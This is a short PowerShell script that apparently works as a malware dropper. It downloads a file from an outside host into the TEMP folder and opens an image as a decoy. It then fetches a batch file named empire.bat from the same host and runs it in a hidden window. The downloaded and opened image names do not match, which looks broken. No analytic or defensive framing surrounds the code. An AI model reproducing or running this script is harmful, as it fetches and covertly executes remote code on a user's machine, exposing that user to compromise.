# Change directory to the TEMP folder
Set-Location -Path $env:TEMP

# Download and open the image
Invoke-WebRequest -Uri "https://tclancy.mygamesonline.org/bit" -OutFile "$env:TEMP\ress.png"
Start-Process "$env:TEMP\bitmine.png"

# Download the batch file
Invoke-WebRequest -Uri "https://tclancy.mygamesonline.org/bat" -OutFile "$env:TEMP\empire.bat"

# Run the batch file hidden in the background
Start-Process -FilePath "$env:TEMP\empire.bat" -WindowStyle Hidden

# Exit the script
exit
